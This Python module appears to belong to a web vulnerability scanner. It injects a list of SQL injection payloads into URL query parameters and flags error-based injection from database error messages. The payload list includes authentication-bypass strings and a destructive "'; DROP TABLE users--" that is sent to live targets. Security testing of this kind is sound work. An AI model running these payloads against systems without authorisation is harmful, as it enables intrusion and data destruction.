import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .utils import get_headers

SQL_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--", '" OR 1=1--',
    "' OR 'x'='x", "1' ORDER BY 1--", "1' ORDER BY 2--",
    "'; DROP TABLE users--", "' UNION SELECT NULL--",
    "' AND 1=1--", "' AND 1=2--", "1 AND 1=1", "1 AND 1=2",
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "ora-01756",
    "sqlite_error",
    "pg_query",
    "sqlstate",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "syntax error",
    "mysql_fetch",
    "supplied argument is not a valid mysql",
]


def run_sql_scan(urls: list, session: requests.Session = None) -> list:
    findings = []
    sess = session or requests.Session()

    for url in urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            continue

        for param in params:
            for payload in SQL_PAYLOADS:
                test_params = params.copy()
                test_params[param] = [payload]

                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))

                try:
                    resp = sess.get(
                        test_url,
                        headers=get_headers(),
                        timeout=10,
                        verify=False
                    )
                    body_lower = resp.text.lower()

                    for error in SQL_ERRORS:
                        if error in body_lower:
                            findings.append({
                                "type": "SQL Injection - Error Based",
                                "severity": "Critical",
                                "url": test_url,
                                "detail": f"SQL error detected in parameter '{param}'.",
                                "evidence": f"Payload: {payload} | Error: '{error}' found in response",
                                "recommendation": "Use parameterized queries / prepared statements. Never concatenate user input into SQL."
                            })
                            break

                except requests.RequestException:
                    continue

    return findings
